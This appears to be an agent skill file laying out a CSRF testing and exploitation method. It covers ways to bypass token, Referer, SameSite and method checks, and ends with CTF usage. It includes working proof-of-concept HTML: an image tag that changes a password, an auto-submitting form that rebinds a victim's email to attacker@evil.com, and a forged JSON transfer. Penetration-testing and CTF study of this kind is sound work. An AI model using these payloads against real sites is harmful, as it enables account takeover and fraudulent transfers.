---
name: csrf-methodology
description: "CSRF (cross-site request forgery) detection and exploitation. Use when a target form or API lacks a CSRF token, authenticates with cookies, or performs sensitive actions such as password change, transfer, or email binding. Induces the victim to click a link so the request executes with their identity"
zh-signals: "检测与利用跨站请求伪造漏洞，覆盖 Token 绕过与防护缺失场景。信号:CSRF,跨站请求伪造,Token绕过,SameSite,敏感操作"
when-to-use: "Use when a target form or API lacks CSRF protection, relies on cookie authentication, or performs sensitive actions such as password change, transfer, or email binding."
metadata:
  tags: "csrf,cross-site request forgery,token,referer,samesite"
  category: "exploit"
---

# CSRF Cross-Site Request Forgery Methodology

CSRF exploits the browser's automatic cookie attachment so that the victim unknowingly sends a request under their own identity.

## Phase 1: Identify CSRF Risk

### 1.1 Check the Protection Mechanisms
For requests performing sensitive actions, check whether any of the following protections exist:
- **CSRF Token**: `<input type="hidden" name="csrf_token">` in the form
- **SameSite Cookie**: `Set-Cookie: session=xxx; SameSite=Strict/Lax`
- **Referer/Origin Check**: the server validates the request source
- **Custom Header**: such as `X-Requested-With: XMLHttpRequest`

### 1.2 High-Value Target Actions
- Change password/email (→ account takeover)
- Transfer/payment
- Add an administrator
- Bind/unbind a third-party account
- Change permissions/roles

## Phase 2: Bypass CSRF Protections

### 2.1 Token Bypass
```
# Drop the token parameter — some implementations only validate when the token is present
csrf_token=  (empty value)

# Use another user's token — some implementations only check token validity without binding it to a user
# Obtain a token with your own account and hand it to the victim

# Token in a cookie — can be set via subdomain XSS
Cookie: csrf=TOKEN
Body: csrf_token=TOKEN  (both only need to match)
```

### 2.2 Referer/Origin Bypass
```
# Send no Referer
<meta name="referrer" content="no-referrer">

# Include the target domain in the URL
https://evil.com/csrf?target.com
https://target.com.evil.com

# Empty Referer (some implementations only check when a Referer is present)
```

### 2.3 SameSite Bypass
- `SameSite=Lax`: GET requests are still allowed cross-site (top-level navigation) → if the action accepts GET, it is exploitable
- `SameSite=None`: no protection
- No SameSite attribute: old browsers default to None
- When POST is blocked by SameSite, switching to GET may not be restricted (the method is not restricted)

### 2.4 Token Validation Flaws
- Use the attacker's token for the victim: hardcode your own token in the PoC
- The server only checks token validity, not ownership (a validation flaw)

### 2.5 Method Bypass
- GET method bypass: some modification actions also accept GET (a developer mistake)
- A `window.location` redirect is enough to trigger the GET request
- When POST is blocked by CSRF protection, GET may not be restricted

## Phase 3: Build the CSRF PoC

### GET Request
```html
<img src="http://target/api/changePassword?new=hacked">
```

### POST Request (auto-submitting form)
```html
<form action="http://target/api/changeEmail" method="POST" id="f">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.getElementById('f').submit();</script>
```

### JSON Body (requires CORS support)
If the API requires `Content-Type: application/json`, check:
- Whether it accepts `Content-Type: text/plain` (which a form can send)
- Whether CORS allows cross-origin POST

```html
<form action="http://target/api/transfer" method="POST" enctype="text/plain">
  <input name='{"amount":1000,"to":"attacker","x":"' value='"}'>
</form>
```

## Phase 4: CTF Scenarios

In CTFs, CSRF is usually combined with an XSS bot:
1. Find the CSRF vulnerability → build the malicious page
2. Submit the link to the "admin bot" (simulating the admin clicking it)
3. The admin performs the action with their own identity (change password/get the flag)
